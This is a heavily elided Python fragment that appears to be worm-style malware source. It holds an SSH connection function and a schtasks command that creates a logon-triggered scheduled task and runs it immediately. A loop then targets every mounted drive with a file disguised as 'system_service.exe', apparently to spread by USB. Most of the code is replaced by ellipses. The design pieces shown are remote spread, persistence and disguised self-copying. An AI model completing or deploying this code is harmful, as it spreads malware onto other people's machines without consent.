...
def connect_to_ssh(host, password):
    ...
    try:
        ...
        # Create the task AND run it immediately
        move_cmd = f'schtasks /create /tn "{task_name}" /tr "{staging_path}" /sc onlogon /rl limited /f && schtasks /run /tn "{task_name}"'
    ...
    while True:
        ...
        try:
            ...
            for drive in drives:
                ...
                usb_target = os.path.join(drive.mountpoint, "system_service.exe")
